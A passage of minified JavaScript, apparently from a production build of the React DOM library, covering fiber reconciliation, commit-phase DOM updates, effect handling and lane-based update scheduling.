ne(t),null;if(r=(t.flags&128)!==0,i=l.rendering,i===null)if(r)vn(l,!1);else{if(G!==0||e!==null&&e.flags&128)for(e=t.child;e!==null;){if(i=Qr(e),i!==null){for(t.flags|=128,vn(l,!1),r=i.updateQueue,r!==null&&(t.updateQueue=r,t.flags|=4),t.subtreeFlags=0,r=n,n=t.child;n!==null;)l=n,e=r,l.flags&=14680066,i=l.alternate,i===null?(l.childLanes=0,l.lanes=e,l.child=null,l.subtreeFlags=0,l.memoizedProps=null,l.memoizedState=null,l.updateQueue=null,l.dependencies=null,l.stateNode=null):(l.childLanes=i.childLanes,l.lanes=i.lanes,l.child=i.child,l.subtreeFlags=0,l.deletions=null,l.memoizedProps=i.memoizedProps,l.memoizedState=i.memoizedState,l.updateQueue=i.updateQueue,l.type=i.type,e=i.dependencies,l.dependencies=e===null?null:{lanes:e.lanes,firstContext:e.firstContext}),n=n.sibling;return _(H,H.current&1|2),t.child}e=e.sibling}l.tail!==null&&$()>on&&(t.flags|=128,r=!0,vn(l,!1),t.lanes=4194304)}else{if(!r)if(e=Qr(i),e!==null){if(t.flags|=128,r=!0,n=e.updateQueue,n!==null&&(t.updateQueue=n,t.flags|=4),vn(l,!0),l.tail===null&&l.tailMode==="hidden"&&!i.alternate&&!z)return ne(t),null}else 2*$()-l.renderingStartTime>on&&n!==1073741824&&(t.flags|=128,r=!0,vn(l,!1),t.lanes=4194304);l.isBackwards?(i.sibling=t.child,t.child=i):(n=l.last,n!==null?n.sibling=i:t.child=i,l.last=i)}return l.tail!==null?(t=l.tail,l.rendering=t,l.tail=t.sibling,l.renderingStartTime=$(),t.sibling=null,n=H.current,_(H,r?n&1|2:n&1),t):(ne(t),null);case 22:case 23:return Ri(),r=t.memoizedState!==null,e!==null&&e.memoizedState!==null!==r&&(t.flags|=8192),r&&t.mode&1?me&1073741824&&(ne(t),t.subtreeFlags&6&&(t.flags|=8192)):ne(t),null;case 24:return null;case 25:return null}throw Error(v(156,t.tag))}function mf(e,t){switch(ai(t),t.tag){case 1:return fe(t.type)&&Ur(),e=t.flags,e&65536?(t.flags=e&-65537|128,t):null;case 3:return nn(),A(de),A(oe),vi(),e=t.flags,e&65536&&!(e&128)?(t.flags=e&-65537|128,t):null;case 5:return gi(t),null;case 13:if(A(H),e=t.memoizedState,e!==null&&e.dehydrated!==null){if(t.alternate===null)throw Error(v(340));en()}return e=t.flags,e&65536?(t.flags=e&-65537|128,t):null;case 19:return A(H),null;case 4:return nn(),null;case 10:return fi(t.type._context),null;case 22:case 23:return Ri(),null;case 24:return null;default:return null}}var gr=!1,re=!1,hf=typeof WeakSet=="function"?WeakSet:Set,C=null;function Jt(e,t){var n=e.ref;if(n!==null)if(typeof n=="function")try{n(null)}catch(r){V(e,t,r)}else n.current=null}function Dl(e,t,n){try{n()}catch(r){V(e,t,r)}}var _s=!1;function gf(e,t){if(gl=Ar,e=Ja(),ii(e)){if("selectionStart"in e)var n={start:e.selectionStart,end:e.selectionEnd};else e:{n=(n=e.ownerDocument)&&n.defaultView||window;var r=n.getSelection&&n.getSelection();if(r&&r.rangeCount!==0){n=r.anchorNode;var o=r.anchorOffset,l=r.focusNode;r=r.focusOffset;try{n.nodeType,l.nodeType}catch{n=null;break e}var i=0,s=-1,a=-1,c=0,p=0,h=e,m=null;t:for(;;){for(var S;h!==n||o!==0&&h.nodeType!==3||(s=i+o),h!==l||r!==0&&h.nodeType!==3||(a=i+r),h.nodeType===3&&(i+=h.nodeValue.length),(S=h.firstChild)!==null;)m=h,h=S;for(;;){if(h===e)break t;if(m===n&&++c===o&&(s=i),m===l&&++p===r&&(a=i),(S=h.nextSibling)!==null)break;h=m,m=h.parentNode}h=S}n=s===-1||a===-1?null:{start:s,end:a}}else n=null}n=n||{start:0,end:0}}else n=null;for(vl={focusedElem:e,selectionRange:n},Ar=!1,C=t;C!==null;)if(t=C,e=t.child,(t.subtreeFlags&1028)!==0&&e!==null)e.return=t,C=e;else for(;C!==null;){t=C;try{var w=t.alternate;if(t.flags&1024)switch(t.tag){case 0:case 11:case 15:break;case 1:if(w!==null){var k=w.memoizedProps,F=w.memoizedState,d=t.stateNode,u=d.getSnapshotBeforeUpdate(t.elementType===t.type?k:Re(t.type,k),F);d.__reactInternalSnapshotBeforeUpdate=u}break;case 3:var f=t.stateNode.containerInfo;f.nodeType===1?f.textContent="":f.nodeType===9&&f.documentElement&&f.removeChild(f.documentElement);break;case 5:case 6:case 4:case 17:break;default:throw Error(v(163))}}catch(g){V(t,t.return,g)}if(e=t.sibling,e!==null){e.return=t.return,C=e;break}C=t.return}return w=_s,_s=!1,w}function Nn(e,t,n){var r=t.updateQueue;if(r=r!==null?r.lastEffect:null,r!==null){var o=r=r.next;do{if((o.tag&e)===e){var l=o.destroy;o.destroy=void 0,l!==void 0&&Dl(t,n,l)}o=o.next}while(o!==r)}}function fo(e,t){if(t=t.updateQueue,t=t!==null?t.lastEffect:null,t!==null){var n=t=t.next;do{if((n.tag&e)===e){var r=n.create;n.destroy=r()}n=n.next}while(n!==t)}}function _l(e){var t=e.ref;if(t!==null){var n=e.stateNode;switch(e.tag){case 5:e=n;break;default:e=n}typeof t=="function"?t(e):t.current=e}}function Uu(e){var t=e.alternate;t!==null&&(e.alternate=null,Uu(t)),e.child=null,e.deletions=null,e.sibling=null,e.tag===5&&(t=e.stateNode,t!==null&&(delete t[Fe],delete t[Vn],delete t[wl],delete t[Yd],delete t[Zd])),e.stateNode=null,e.return=null,e.dependencies=null,e.memoizedProps=null,e.memoizedState=null,e.pendingProps=null,e.stateNode=null,e.updateQueue=null}function Wu(e){return e.tag===5||e.tag===3||e.tag===4}function Is(e){e:for(;;){for(;e.sibling===null;){if(e.return===null||Wu(e.return))return null;e=e.return}for(e.sibling.return=e.return,e=e.sibling;e.tag!==5&&e.tag!==6&&e.tag!==18;){if(e.flags&2||e.child===null||e.tag===4)continue e;e.child.return=e,e=e.child}if(!(e.flags&2))return e.stateNode}}function Il(e,t,n){var r=e.tag;if(r===5||r===6)e=e.stateNode,t?n.nodeType===8?n.parentNode.insertBefore(e,t):n.insertBefore(e,t):(n.nodeType===8?(t=n.parentNode,t.insertBefore(e,n)):(t=n,t.appendChild(e)),n=n._reactRootContainer,n!=null||t.onclick!==null||(t.onclick=Hr));else if(r!==4&&(e=e.child,e!==null))for(Il(e,t,n),e=e.sibling;e!==null;)Il(e,t,n),e=e.sibling}function Al(e,t,n){var r=e.tag;if(r===5||r===6)e=e.stateNode,t?n.insertBefore(e,t):n.appendChild(e);else if(r!==4&&(e=e.child,e!==null))for(Al(e,t,n),e=e.sibling;e!==null;)Al(e,t,n),e=e.sibling}var Z=null,Ne=!1;function Xe(e,t,n){for(n=n.child;n!==null;)Vu(e,t,n),n=n.sibling}function Vu(e,t,n){if(ze&&typeof ze.onCommitFiberUnmount=="function")try{ze.onCommitFiberUnmount(ro,n)}catch{}switch(n.tag){case 5:re||Jt(n,t);case 6:var r=Z,o=Ne;Z=null,Xe(e,t,n),Z=r,Ne=o,Z!==null&&(Ne?(e=Z,n=n.stateNode,e.nodeType===8?e.parentNode.removeChild(n):e.removeChild(n)):Z.removeChild(n.stateNode));break;case 18:Z!==null&&(Ne?(e=Z,n=n.stateNode,e.nodeType===8?zo(e.parentNode,n):e.nodeType===1&&zo(e,n),Fn(e)):zo(Z,n.stateNode));break;case 4:r=Z,o=Ne,Z=n.stateNode.containerInfo,Ne=!0,Xe(e,t,n),Z=r,Ne=o;break;case 0:case 11:case 14:case 15:if(!re&&(r=n.updateQueue,r!==null&&(r=r.lastEffect,r!==null))){o=r=r.next;do{var l=o,i=l.destroy;l=l.tag,i!==void 0&&(l&2||l&4)&&Dl(n,t,i),o=o.next}while(o!==r)}Xe(e,t,n);break;case 1:if(!re&&(Jt(n,t),r=n.stateNode,typeof r.componentWillUnmount=="function"))try{r.props=n.memoizedProps,r.state=n.memoizedState,r.componentWillUnmount()}catch(s){V(n,t,s)}Xe(e,t,n);break;case 21:Xe(e,t,n);break;case 22:n.mode&1?(re=(r=re)||n.memoizedState!==null,Xe(e,t,n),re=r):Xe(e,t,n);break;default:Xe(e,t,n)}}function As(e){var t=e.updateQueue;if(t!==null){e.updateQueue=null;var n=e.stateNode;n===null&&(n=e.stateNode=new hf),t.forEach(function(r){var o=Ef.bind(null,e,r);n.has(r)||(n.add(r),r.then(o,o))})}}function je(e,t){var n=t.deletions;if(n!==null)for(var r=0;r<n.length;r++){var o=n[r];try{var l=e,i=t,s=i;e:for(;s!==null;){switch(s.tag){case 5:Z=s.stateNode,Ne=!1;break e;case 3:Z=s.stateNode.containerInfo,Ne=!0;break e;case 4:Z=s.stateNode.containerInfo,Ne=!0;break e}s=s.return}if(Z===null)throw Error(v(160));Vu(l,i,o),Z=null,Ne=!1;var a=o.alternate;a!==null&&(a.return=null),o.return=null}catch(c){V(o,t,c)}}if(t.subtreeFlags&12854)for(t=t.child;t!==null;)Bu(t,e),t=t.sibling}function Bu(e,t){var n=e.alternate,r=e.flags;switch(e.tag){case 0:case 11:case 14:case 15:if(je(t,e),Ie(e),r&4){try{Nn(3,e,e.return),fo(3,e)}catch(k){V(e,e.return,k)}try{Nn(5,e,e.return)}catch(k){V(e,e.return,k)}}break;case 1:je(t,e),Ie(e),r&512&&n!==null&&Jt(n,n.return);break;case 5:if(je(t,e),Ie(e),r&512&&n!==null&&Jt(n,n.return),e.flags&32){var o=e.stateNode;try{Dn(o,"")}catch(k){V(e,e.return,k)}}if(r&4&&(o=e.stateNode,o!=null)){var l=e.memoizedProps,i=n!==null?n.memoizedProps:l,s=e.type,a=e.updateQueue;if(e.updateQueue=null,a!==null)try{s==="input"&&l.type==="radio"&&l.name!=null&&da(o,l),il(s,i);var c=il(s,l);for(i=0;i<a.length;i+=2){var p=a[i],h=a[i+1];p==="style"?ga(o,h):p==="dangerouslySetInnerHTML"?ma(o,h):p==="children"?Dn(o,h):Ql(o,p,h,c)}switch(s){case"input":tl(o,l);break;case"textarea":fa(o,l);break;case"select":var m=o._wrapperState.wasMultiple;o._wrapperState.wasMultiple=!!l.multiple;var S=l.value;S!=null?Kt(o,!!l.multiple,S,!1):m!==!!l.multiple&&(l.defaultValue!=null?Kt(o,!!l.multiple,l.defaultValue,!0):Kt(o,!!l.multiple,l.multiple?[]:"",!1))}o[Vn]=l}catch(k){V(e,e.return,k)}}break;case 6:if(je(t,e),Ie(e),r&4){if(e.stateNode===null)throw Error(v(162));o=e.stateNode,l=e.memoizedProps;try{o.nodeValue=l}catch(k){V(e,e.return,k)}}break;case 3:if(je(t,e),Ie(e),r&4&&n!==null&&n.memoizedState.isDehydrated)try{Fn(t.containerInfo)}catch(k){V(e,e.return,k)}break;case 4:je(t,e),Ie(e);break;case 13:je(t,e),Ie(e),o=e.child,o.flags&8192&&(l=o.memoizedState!==null,o.stateNode.isHidden=l,!l||o.alternate!==null&&o.alternate.memoizedState!==null||(Pi=$())),r&4&&As(e);break;case 22:if(p=n!==null&&n.memoizedState!==null,e.mode&1?(re=(c=re)||p,je(t,e),re=c):je(t,e),Ie(e),r&8192){if(c=e.memoizedState!==null,(e.stateNode.isHidden=c)&&!p&&e.mode&1)for(C=e,p=e.child;p!==null;){for(h=C=p;C!==null;){switch(m=C,S=m.child,m.tag){case 0:case 11:case 14:case 15:Nn(4,m,m.return);break;case 1:Jt(m,m.return);var w=m.stateNode;if(typeof w.componentWillUnmount=="function"){r=m,n=m.return;try{t=r,w.props=t.memoizedProps,w.state=t.memoizedState,w.componentWillUnmount()}catch(k){V(r,n,k)}}break;case 5:Jt(m,m.return);break;case 22:if(m.memoizedState!==null){zs(h);continue}}S!==null?(S.return=m,C=S):zs(h)}p=p.sibling}e:for(p=null,h=e;;){if(h.tag===5){if(p===null){p=h;try{o=h.stateNode,c?(l=o.style,typeof l.setProperty=="function"?l.setProperty("display","none","important"):l.display="none"):(s=h.stateNode,a=h.memoizedProps.style,i=a!=null&&a.hasOwnProperty("display")?a.display:null,s.style.display=ha("display",i))}catch(k){V(e,e.return,k)}}}else if(h.tag===6){if(p===null)try{h.stateNode.nodeValue=c?"":h.memoizedProps}catch(k){V(e,e.return,k)}}else if((h.tag!==22&&h.tag!==23||h.memoizedState===null||h===e)&&h.child!==null){h.child.return=h,h=h.child;continue}if(h===e)break e;for(;h.sibling===null;){if(h.return===null||h.return===e)break e;p===h&&(p=null),h=h.return}p===h&&(p=null),h.sibling.return=h.return,h=h.sibling}}break;case 19:je(t,e),Ie(e),r&4&&As(e);break;case 21:break;default:je(t,e),Ie(e)}}function Ie(e){var t=e.flags;if(t&2){try{e:{for(var n=e.return;n!==null;){if(Wu(n)){var r=n;break e}n=n.return}throw Error(v(160))}switch(r.tag){case 5:var o=r.stateNode;r.flags&32&&(Dn(o,""),r.flags&=-33);var l=Is(e);Al(e,l,o);break;case 3:case 4:var i=r.stateNode.containerInfo,s=Is(e);Il(e,s,i);break;default:throw Error(v(161))}}catch(a){V(e,e.return,a)}e.flags&=-3}t&4096&&(e.flags&=-4097)}function vf(e,t,n){C=e,Ju(e)}function Ju(e,t,n){for(var r=(e.mode&1)!==0;C!==null;){var o=C,l=o.child;if(o.tag===22&&r){var i=o.memoizedState!==null||gr;if(!i){var s=o.alternate,a=s!==null&&s.memoizedState!==null||re;s=gr;var c=re;if(gr=i,(re=a)&&!c)for(C=o;C!==null;)i=C,a=i.child,i.tag===22&&i.memoizedState!==null?Hs(o):a!==null?(a.return=i,C=a):Hs(o);for(;l!==null;)C=l,Ju(l),l=l.sibling;C=o,gr=s,re=c}Fs(e)}else o.subtreeFlags&8772&&l!==null?(l.return=o,C=l):Fs(e)}}function Fs(e){for(;C!==null;){var t=C;if(t.flags&8772){var n=t.alternate;try{if(t.flags&8772)switch(t.tag){case 0:case 11:case 15:re||fo(5,t);break;case 1:var r=t.stateNode;if(t.flags&4&&!re)if(n===null)r.componentDidMount();else{var o=t.elementType===t.type?n.memoizedProps:Re(t.type,n.memoizedProps);r.componentDidUpdate(o,n.memoizedState,r.__reactInternalSnapshotBeforeUpdate)}var l=t.updateQueue;l!==null&&ks(t,l,r);break;case 3:var i=t.updateQueue;if(i!==null){if(n=null,t.child!==null)switch(t.child.tag){case 5:n=t.child.stateNode;break;case 1:n=t.child.stateNode}ks(t,i,n)}break;case 5:var s=t.stateNode;if(n===null&&t.flags&4){n=s;var a=t.memoizedProps;switch(t.type){case"button":case"input":case"select":case"textarea":a.autoFocus&&n.focus();break;case"img":a.src&&(n.src=a.src)}}break;case 6:break;case 4:break;case 12:break;case 13:if(t.memoizedState===null){var c=t.alternate;if(c!==null){var p=c.memoizedState;if(p!==null){var h=p.dehydrated;h!==null&&Fn(h)}}}break;case 19:case 17:case 21:case 22:case 23:case 25:break;default:throw Error(v(163))}re||t.flags&512&&_l(t)}catch(m){V(t,t.return,m)}}if(t===e){C=null;break}if(n=t.sibling,n!==null){n.return=t.return,C=n;break}C=t.return}}function zs(e){for(;C!==null;){var t=C;if(t===e){C=null;break}var n=t.sibling;if(n!==null){n.return=t.return,C=n;break}C=t.return}}function Hs(e){for(;C!==null;){var t=C;try{switch(t.tag){case 0:case 11:case 15:var n=t.return;try{fo(4,t)}catch(a){V(t,n,a)}break;case 1:var r=t.stateNode;if(typeof r.componentDidMount=="function"){var o=t.return;try{r.componentDidMount()}catch(a){V(t,o,a)}}var l=t.return;try{_l(t)}catch(a){V(t,l,a)}break;case 5:var i=t.return;try{_l(t)}catch(a){V(t,i,a)}}}catch(a){V(t,t.return,a)}if(t===e){C=null;break}var s=t.sibling;if(s!==null){s.return=t.return,C=s;break}C=t.return}}var yf=Math.ceil,Xr=be.ReactCurrentDispatcher,xi=be.ReactCurrentOwner,Te=be.ReactCurrentBatchConfig,L=0,Y=null,K=null,q=0,me=0,$t=mt(0),G=0,Gn=null,Rt=0,po=0,Ei=0,Mn=null,ue=null,Pi=0,on=1/0,Ue=null,Yr=!1,Fl=null,at=null,vr=!1,nt=null,Zr=0,On=0,zl=null,Rr=-1,Nr=0;function ie(){return L&6?$():Rr!==-1?Rr:Rr=$()}function ut(e){return e.mode&1?L&2&&q!==0?q&-q:ef.transition!==null?(Nr===0&&(Nr=Ra()),Nr):(e=D,e!==0||(e=window.event,e=e===void 0?16:Ia(e.type)),e):1}function De(e,t,n,r){if(50<On)throw On=0,zl=null,Error(v(185));Xn(e,n,r),(!(L&2)||e!==Y)&&(e===Y&&(!(L&2)&&(po|=n),G===4&&et(e,q)),pe(e,r),n===1&&L===0&&!(t.mode&1)&&(on=$()+500,ao&&ht()))}function pe(e,t){var n=e.callbackNode;ed(e,t);var r=Ir(e,e===Y?q:0);if(r===0)n!==null&&Gi(n),e.callbackNode=null,e.callbackPriority=0;else if(t=r&-r,e.callbackPriority!==t){if(n!=null&&Gi(n),t===1)e.tag===0?qd(Us.bind(null,e)):eu(Us.bind(null,e)),bd(function(){!(L&6)&&ht()}),n=null;else{switch(Na(r)){case 1:n=Zl;break;case 4:n=Pa;break;case 16:n=_r;break;case 536870912:n=ja;break;default:n=_r}n=Zu(n,$u.bind(null,e))}e.callbackPriority=t,e.callbackNode=n}}function $u(e,t){if(Rr=-1,Nr=0,L&6)throw Error(v(327));var n=e.callbackNode;if(Yt()&&e.callbackNode!==n)return null;var r=Ir(e,e===Y?q:0);if(r===0)return null;if(r&30||r&e.expiredLanes||t)t=qr(e,r);else{t=r;var o=L;L|=2;var l=Qu();(Y!==e||q!==t)&&(Ue=null,on=$()+500,Tt(e,t));do try{kf();break}catch(s){Ku(e,s)}while(!0);di(),Xr.current=l,L=o,K!==null?t=0:(Y=null,q=0,t=G)}if(t!==0){if(t===2&&(o=dl(e),o!==0&&(r=o,t=Hl(e,o))),t===1)throw n=Gn,Tt(e,0),et(e,r),pe(e,$()),n;if(t===6)et(e,r);else{if(o=e.current.alternate,!(r&30)&&!Sf(o)&&(t=qr(e,r),t===2&&(l=dl(e),l!==0&&(r=l,t=Hl(e,l))),t===1))throw n=Gn,Tt(e,0),et(e,r),pe(e,$()),n;switch(e.finishedWork=o,e.finishedLanes=r,t){case 0:case 1:throw Error(v(345));case 2:St(e,ue,Ue);break;case 3:if(et(e,r),(r&130023424)===r&&(t=Pi+500-$(),10<t)){if(Ir(e,0)!==0)break;if(o=e.suspendedLanes,(o&r)!==r){ie(),e.pingedLanes|=e.suspendedLanes&o;break}e.timeoutHandle=Sl(St.bind(null,e,ue,Ue),t);break}St(e,ue,Ue);break;case 4:if(et(e,r),(r&4194240)===r)break;for(t=e.eventTimes,o=-1;0<r;){var i=31-Le(r);l=1<<i,i=t[i],i>o&&(o=i),r&=~l}if(r=o,r=$()-r,r=(120>r?120:480>r?480:1080>r?1080:1920>r?1920:3e3>r?3e3:4320>r?4320:1960*yf(r/1960))-r,10<r){e.timeoutHandle=Sl(St.bind(null,e,ue,Ue),r);break}St(e,ue,Ue);break;case 5:St(e,ue,Ue);break;default:throw Error(v(329))}}}return pe(e,$()),e.callbackNode===n?$u.bind(null,e):null}function Hl(e,t){var n=Mn;return e.current.memoizedState.isDehydrated&&(Tt(e,t).flags|=256),e=qr(e,t),e!==2&&(t=ue,ue=n,t!==null&&Ul(t)),e}function Ul(e){ue===null?ue=e:ue.push.apply(ue,e)}function Sf(e){for(var t=e;;){if(t.flags&16384){var n=t.updateQueue;if(n!==null&&(n=n.stores,n!==null))for(var r=0;r<n.length;r++){var o=n[r],l=o.getSnapshot;o=o.value;try{if(!_e(l(),o))return!1}catch{return!1}}}if(n=t.child,t.subtreeFlags&16384&&n!==null)n.return=t,t=n;else{if(t===e)break;for(;t.sibling===null;){if(t.return===null||t.return===e)return!0;t=t.return}t.sibling.return=t.return,t=t.sibling}}return!0}function et(e,t){for(t&=~Ei,t&=~po,e.suspendedLanes|=t,e.pingedLanes&=~t,e=e.expirationTimes;0<t;){var n=31-Le(t),r=1<<n;e[n]=-1,t&=~r}}function Us(e){if(L&6)throw Error(v(327));Yt();var t=Ir(e,0);if(!(t&1))return pe(e,$()),null;var n=qr(e,t);if(e.tag!==0&&n===2){var r=dl(e);r!==0&&(t=r,n=Hl(e,r))}if(n===1)throw n=Gn,Tt(e,0),et(e,t),pe(e,$()),n;if(n===6)throw Error(v(345));return e.finishedWork=e.current.alternate,e.finishedLanes=t,St(e,ue,Ue),pe(e,$()),null}function ji(e,t){var n=L;L|=1;try{return e(t)}finally{L=n,L===0&&(on=$()+500,ao&&ht())}}function Nt(e){nt!==null&&nt.tag===0&&!(L&6)&&Yt();var t=L;L|=1;var n=Te.transition,r=D;try{if(Te.transition=null,D=1,e)return e()}finally{D=r,Te.transition=n,L=t,!(L&6)&&ht()}}function Ri(){me=$t.current,A($t)}function Tt(e,t){e.finishedWork=null,e.finishedLanes=0;var n=e.timeoutHandle;if(n!==-1&&(e.timeoutHandle=-1,Gd(n)),K!==null)for(n=K.return;n!==null;){var r=n;switch(ai(r),r.tag){case 1:r=r.type.childContextTypes,r!=null&&Ur();break;case 3:nn(),A(de),A(oe),vi();break;case 5:gi(r);break;case 4:nn();break;case 13:A(H);break;case 19:A(H);break;case 10:fi(r.type._context);break;case 22:case 23:Ri()}n=n.return}if(Y=e,K=e=ct(e.current,null),q=me=t,G=0,Gn=null,Ei=po=Rt=0,ue=Mn=null,kt!==null){for(t=0;t<kt.length;t++)if(n=kt[t],r=n.interleaved,r!==null){n.interleaved=null;var o=r.next,l=n.pending;if(l!==null){var i=l.next;l.next=o,r.next=i}n.pending=r}kt=null}return e}function Ku(e,t){do{var n=K;try{if(di(),Er.current=br,Gr){for(var r=U.memoizedState;r!==null;){var o=r.queue;o!==null&&(o.pending=null),r=r.next}Gr=!1}if(jt=0,X=Q=U=null,Rn=!1,$n=0,xi.current=null,n===null||n.return===null){G=1,Gn=t,K=null;break}e:{var l=e,i=n.return,s=n,a=t;if(t=q,s.flags|=32768,a!==null&&typeof a=="object"&&typeof a.then=="function"){var c=a,p=s,h=p.tag;if(!(p.mode&1)&&(h===0||h===11||h===15)){var m=p.alternate;m?(p.updateQueue=m.updateQueue,p.memoizedState=m.memoizedState,p.lanes=m.lanes):(p.updateQueue=null,p.memoizedState=null)}var S=js(i);if(S!==null){S.flags&=-257,Rs(S,i,s,l,t),S.mode&1&&Ps(l,c,t),t=S,a=c;var w=t.updateQueue;if(w===null){var k=new Set;k.add(a),t.updateQueue=k}else w.add(a);break e}else{if(!(t&1)){Ps(l,c,t),Ni();break e}a=Error(v(426))}}else if(z&&s.mode&1){var F=js(i);if(F!==null){!(F.flags&65536)&&(F.flags|=256),Rs(F,i,s,l,t),ui(rn(a,s));break e}}l=a=rn(a,s),G!==4&&(G=2),Mn===null?Mn=[l]:Mn.push(l),l=i;do{switch(l.tag){case 3:l.flags|=65536,t&=-t,l.lanes|=t;var d=Nu(l,a,t);ws(l,d);break e;case 1:s=a;var u=l.type,f=l.stateNode;if(!(l.flags&128)&&(typeof u.getDerivedStateFromError=="function"||f!==null&&typeof f.componentDidCatch=="function"&&(at===null||!at.has(f)))){l.flags|=65536,t&=-t,l.lanes|=t;var g=Mu(l,s,t);ws(l,g);break e}}l=l.return}while(l!==null)}bu(n)}catch(T){t=T,K===n&&n!==null&&(K=n=n.return);continue}break}while(!0)}function Qu(){var e=Xr.current;return Xr.current=br,e===null?br:e}function Ni(){(G===0||G===3||G===2)&&(G=4),Y===null||!(Rt&268435455)&&!(po&268435455)||et(Y,q)}function qr(e,t){var n=L;L|=2;var r=Qu();(Y!==e||q!==t)&&(Ue=null,Tt(e,t));do try{wf();break}catch(o){Ku(e,o)}while(!0);if(di(),L=n,Xr.current=r,K!==null)throw Error(v(261));return Y=null,q=0,G}function wf(){for(;K!==null;)Gu(K)}function kf(){for(;K!==null&&!$c();)Gu(K)}function Gu(e){var t=Yu(e.alternate,e,me);e.memoizedProps=e.pendingProps,t===null?bu(e):K=t,xi.current=null}function bu(e){var t=e;do{var n=t.alternate;if(e=t.return,t.flags&32768){if(n=mf(n,t),n!==null){n.flags&=32767,K=n;return}if(e!==null)e.flags|=32768,e.subtreeFlags=0,e.deletions=null;else{G=6,K=null;return}}else if(n=pf(n,t,me),n!==null){K=n;return}if(t=t.sibling,t!==null){K=t;return}K=t=e}while(t!==null);G===0&&(G=5)}function St(e,t,n){var r=D,o=Te.transition;try{Te.transition=null,D=1,Cf(e,t,n,r)}finally{Te.transition=o,D=r}return null}function Cf(e,t,n,r){do Yt();while(nt!==null);if(L&6)throw Error(v(327));n=e.finishedWork;var o=e.finishedLanes;if(n===null)return null;if(e.finishedWork=null,e.finishedLanes=0,n===e.current)throw Error(v(177));e.callbackNode=null,e.callbackPriority=0;var l=n.lanes|n.childLanes;if(td(e,l),e===Y&&(K=Y=null,q=0),!(n.subtreeFlags&2064)&&!(n.flags&2064)||vr||(vr=!0,Zu(_r,function(){return Yt(),null})),l=(n.flags&15990)!==0,n.subtreeFlags&15990||l){l=Te.transition,Te.transition=null;var i=D;D=1;var s=L;L|=4,xi.current=null,gf(e,n),Bu(n,e),Wd(vl),Ar=!!gl,vl=gl=null,e.current=n,vf(n),Kc(),L=s,D=i,Te.transition=l}else e.current=n;if(vr&&(vr=!1,nt=e,Zr=o),l=e.pendingLanes,l===0&&(at=null),bc(n.stateNode),pe(e,$()),t!==null)for(r=e.onRecoverableError,n=0;n<t.length;n++)o=t[n],r(o.value,{componentStack:o.stack,digest:o.digest});if(Yr)throw Yr=!1,e=Fl,Fl=null,e;return Zr&1&&e.tag!==0&&Yt(),l=e.pendingLanes,l&1?e===zl?On++:(On=0,zl=e):On=0,ht(),null}function Yt(){if(nt!==null){var e=Na(Zr),t=Te.transition,n=D;try{if(Te.transition=null,D=16>e?16:e,nt===null)var r=!1;else{if(e=nt,nt=null,Zr=0,L&6)throw Error(v(331));var o=L;for(L|=4,C=e.current;C!==null;){var l=C,i=l.child;if(C.flags&16){var s=l.deletions;if(s!==null){for(var a=0;a<s.length;a++){var c=s[a];for(C=c;C!==null;){var p=C;switch(p.tag){case 0:case 11:case 15:Nn(8,p,l)}var h=p.child;if(h!==null)h.return=p,C=h;else for(;C!==null;){p=C;var m=p.sibling,S=p.return;if(Uu(p),p===c){C=null;break}if(m!==null){m.return=S,C=m;break}C=S}}}var w=l.alternate;if(w!==null){var k=w.child;if(k!==null){w.child=null;do{var F=k.sibling;k.sibling=null,k=F}while(k!==null)}}C=l}}if(l.subtreeFlags&2064&&i!==null)i.return=l,C=i;else e:for(;C!==null;){if(l=C,l.flags&2048)switch(l.tag){case 0:case 11:case 15:Nn(9,l,l.return)}var d=l.sibling;if(d!==null){d.return=l.return,C=d;break e}C=l.return}}var u=e.current;for(C=u;C!==null;){i=C;var f=i.child;if(i.subtreeFlags&2064&&f!==null)f.return=i,C=f;else e:for(i=u;C!==null;){if(s=C,s.flags&2048)try{switch(s.tag){case 0:case 11:case 15:fo(9,s)}}catch(T){V(s,s.return,T)}if(s===i){C=null;break e}var g=s.sibling;if(g!==null){g.return=s.return,C=g;break e}C=s.return}}if(L=o,ht(),ze&&typeof ze.onPostCommitFiberRoot=="function")try{ze.onPostCommitFiberRoot(ro,e)}catch{}r=!0}return r}finally{D=n,Te.transition=t}}return!1}function Ws(e,t,n){t=rn(n,t),t=Nu(e,t,1),e=st(e,t,1),t=ie(),e!==null&&(Xn(e,1,t),pe(e,t))}function V(e,t,n){if(e.tag===3)Ws(e,e,n);else for(;t!==null;){if(t.tag===3){Ws(t,e,n);break}else if(t.tag===1){var r=t.stateNode;if(typeof t.type.getDerivedStateFromError=="function"||typeof r.componentDidCatch=="function"&&(at===null||!at.has(r))){e=rn(n,e),e=Mu(t,e,1),t=st(t,e,1),e=ie(),t!==null&&(Xn(t,1,e),pe(t,e));break}}t=t.return}}function Tf(e,t,n){var r=e.pingCache;r!==null&&r.delete(t),t=ie(),e.pingedLanes|=e.suspendedLanes&n,Y===e&&(q&n)===n&&(G===4||G===3&&(q&130023424)===q&&500>$()-Pi?Tt(e,0):Ei|=n),pe(e,t)}function Xu(e,t){t===0&&(e.mode&1?(t=sr,sr<<=1,!(sr&130023424)&&(sr=4194304)):t=1);var n=ie();e=Qe(e,t),e!==null&&(Xn(e,t,n),pe(e,n))}function xf(e){var t=e.memoizedState,n=0;t!==null&&(n=t.retryLane),Xu(e,n)}function Ef(e,t){var n=0;switch(e.tag){case 13:var r=e.stateNode,o=e.memoizedState;o!==null&&(n=o.retryLane);break;case 19:r=e.stateNode;break;default:throw Error(v(314))}r!==null&&r.delete(t),Xu(e,n)}var Yu;Yu=function(e,t,n){if(e!==null)if(e.memoizedProps!==t.pendingProps||de.current)ce=!0;else{if(!(e.lanes&n)&&!(t.flags&128))return ce=!1,ff(e,t,n);ce=!!(e.flags&131072)}else ce=!1,z&&t.flags&1048576&&tu(t,Br,t.index);switch(t.lanes=0,t.tag){case 2:var r=t.type;jr(e,t),e=t.pendingProps;var o=qt(t,oe.current);Xt(t,n),o=Si(null,t,r,e,o,n);var l=wi();return t.flags|=1,typeof o=="object"&&o!==null&&typeof o.render=="function"&&o.$$typeof===void 0?(t.tag=1,t.memoizedState=null,t.updateQueue=null,fe(r)?(l=!0,Wr(t)):l=!1,t.memoizedState=o.state!==null&&o.state!==void 0?o.state:null,mi(t),o.updater=co,t.stateNode=o,o._reactInternals=t,Pl(t,r,e,n),t=Nl(null,t,r,!0,l,n)):(t.tag=0,z&&l&&si(t),le(null,t,o,n),t=t.child),t;case 16:r=t.elementType;e:{switch(jr(e,t),e=t.pendingProps,o=r._init,r=o(r._payload),t.type=r,o=t.tag=jf(r),e=Re(r,e),o){case 0:t=Rl(null,t,r,e,n);break e;case 1:t=Os(null,t,r,e,n);break e;case 11:t=Ns(null,t,r,e,n);break e;case 14:t=Ms(null,t,r,Re(r.type,e),n);break e}throw 